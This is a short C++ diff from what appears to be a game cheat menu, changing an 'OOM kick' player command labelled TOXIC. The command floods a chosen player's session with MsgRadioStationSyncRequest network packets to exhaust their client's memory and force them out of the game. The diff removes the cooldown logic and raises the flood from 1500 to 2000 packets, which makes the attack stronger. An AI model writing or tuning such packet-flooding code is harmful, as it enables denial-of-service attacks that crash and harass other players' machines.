@@ -13,8 +13,6 @@ namespace big
 	{
 		using player_command::player_command;
 
-		std::chrono::system_clock::time_point last_oom_kick_time{};
-
 		virtual CommandAccessLevel get_access_level()
 		{
 			return CommandAccessLevel::TOXIC;
@@ -22,20 +20,12 @@ namespace big
 
 		virtual void execute(player_ptr player, const std::vector<uint64_t>& _args, const std::shared_ptr<command_context> ctx)
 		{
-			//if (std::chrono::system_clock::now() - last_oom_kick_time < 7s)
-			//{
-			//	g_notification_service->push_error("Kick", "Don't spam this or it will backfire");
-			//	return;
-			//}
-
-			last_oom_kick_time = std::chrono::system_clock::now();
-
 			packet msg{};
 
 			msg.write_message(rage::eNetMessage::MsgRadioStationSyncRequest);
 			auto msg_id = player->get_session_player()->m_msg_id;
 
-			for (int j = 0; j < 1500; j++)
+			for (int j = 0; j < 2000; j++)
 			{
 				msg.send(msg_id);
 			}
